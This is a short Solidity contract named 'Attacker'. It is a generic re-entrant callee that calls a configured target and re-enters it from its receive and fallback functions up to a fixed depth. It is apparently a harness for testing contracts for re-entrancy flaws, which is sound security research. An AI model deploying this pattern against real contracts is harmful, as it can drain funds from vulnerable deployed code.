// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// Re-entrant callee. It is given the target and a calldata payload and calls
/// back on receiving value, up to a small depth bound. The same contract is
/// used unchanged for every family, and it is not told which statement is at
/// fault or what the safety property is.
contract Attacker {
    address public target;
    bytes public payload;
    uint256 private depth;
    uint256 public constant MAX_DEPTH = 2;

    function configure(address t, bytes calldata p) public {
        target = t;
        payload = p;
    }

    function kick() external {
        (bool ok, ) = target.call(payload);
        ok;
    }

    receive() external payable { _reenter(); }
    fallback() external payable { _reenter(); }

    function _reenter() internal {
        if (depth < MAX_DEPTH) {
            depth += 1;
            (bool ok, ) = target.call(payload);
            ok;
            depth -= 1;
        }
    }
}
